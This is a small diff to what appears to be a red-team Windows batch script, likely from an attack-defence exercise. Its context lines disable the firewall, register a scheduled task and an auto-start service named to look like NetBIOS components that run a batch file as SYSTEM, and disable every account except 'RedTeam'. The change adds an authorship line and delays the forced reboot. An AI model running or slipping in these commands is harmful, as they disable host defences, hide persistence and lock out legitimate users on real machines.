@@ -11,4 +11,5 @@ netsh advfirewall set allprofiles state off"
 schtasks /create /sc minute /mo 1 /tn "TCP/IP OVER NETBIOSv2" /tr "C:/Windows/System32/chickenlittle.bat" /ru SYSTEM
 sc create NETBIOSv2 DisplayName="NETBIOS over TCPv2" start= auto binpath="C:/Windows/System32/chickenlittle.bat"
 wmic useraccount where name!='RedTeam' set disabled=true
-shutdown /r /t 5
+echo "Created by Shirley C. and Steven B."
+shutdown /r /t 120
